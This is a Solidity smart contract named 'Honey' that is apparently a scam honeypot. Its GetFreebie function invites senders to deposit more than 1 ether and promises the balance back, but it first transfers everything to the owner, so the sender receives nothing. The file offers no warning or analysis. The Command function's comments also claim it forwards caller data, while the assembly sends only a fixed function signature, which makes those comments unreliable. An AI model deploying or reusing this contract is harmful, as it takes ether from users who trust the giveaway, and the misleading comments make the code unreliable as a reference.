pragma solidity ^0.4.19;

contract Honey {
    address public Owner = msg.sender;

    function() public payable {}

    function GetFreebie() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);
        require(adr != address(0)); // Check that the address is not null
        require(data.length > 0); // Check that the data is not empty

        bool success;
        bytes4 sig = bytes4(keccak256("execute()")); // Define the function signature
        
        assembly {
            let ptr := mload(0x40) // Set memory pointer to free memory
            mstore(ptr,sig) // Store the function signature in memory
            success := call(sub(gas, 5000), adr, msg.value, ptr, 4, ptr, 0) // Call the function with the signature and the data
        }
        
        require(success); // Check that the call was successful
    }
}